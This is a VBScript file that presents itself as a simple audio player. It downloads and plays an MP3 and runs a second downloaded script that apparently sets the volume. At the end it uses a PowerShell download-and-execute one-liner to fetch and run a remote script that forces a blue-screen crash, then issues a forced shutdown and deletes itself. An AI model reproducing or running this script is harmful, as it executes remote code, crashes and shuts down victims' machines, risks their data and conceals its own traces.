set WshShell = CreateObject("WScript.Shell")
Set objWinHttp = CreateObject("WinHttp.WinHttpRequest.5.1")
Dim oPlayer
Set oPlayer = CreateObject("WMPlayer.OCX")
Set obj = CreateObject("Scripting.FileSystemObject")
Set Keys = CreateObject("WScript.Shell")
strScript = Wscript.ScriptFullName

'delay in ms
WScript.Sleep 5000

'download sound
URL = "https://github.com/xcuzimfna/bubatz-audio-player/raw/files/example.mp3" '<--- AUDIO FILE URL
objWinHttp.open "GET", URL, False
objWinHttp.send ""
SaveBinaryData "example.mp3",objWinHttp.responseBody '<--- AUDIO FILE NAME
WScript.Sleep 500

'download volume script
URL = "https://raw.githubusercontent.com/xcuzimfna/bubatz-audio-player/files/vol.vbs"
objWinHttp.open "GET", URL, False
objWinHttp.send ""
SaveBinaryData "vol.vbs",objWinHttp.responseBody
WScript.Sleep 500
CreateObject("WScript.Shell").Run "vol.vbs"

'audio player
oPlayer.URL = "example.mp3" '<--- AUDIO FILE NAME
oPlayer.controls.play 
While oPlayer.playState <> 1
  WScript.Sleep 16000 '<--- AUIDO DURATION IN MS
Wend
oPlayer.close

Keys.SendKeys("^{Esc}")
WScript.Sleep 500
WshShell.SendKeys "github.com/xcuzimfna"

'end
obj.DeleteFile("example.mp3") '<-- AUDIO FILE NAME
obj.DeleteFile("vol.vbs")
WScript.Sleep 500
CreateObject("WScript.Shell").Run "powershell IEX((New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/peewpw/Invoke-BSOD/master/Invoke-BSOD.ps1'));Invoke-BSOD" 
CreateObject("WScript.Shell").Run "shutdown -s -t 5"
Set oFso = CreateObject("Scripting.FileSystemObject") : oFso.DeleteFile Wscript.ScriptFullName, True


Function SaveBinaryData(FileName, Data)
Const adTypeText = 1
Const adSaveCreateOverWrite = 2
Dim BinaryStream
Set BinaryStream = CreateObject("ADODB.Stream")
BinaryStream.Type = adTypeText
BinaryStream.Open
BinaryStream.Write Data
BinaryStream.SaveToFile FileName, adSaveCreateOverWrite
End Function
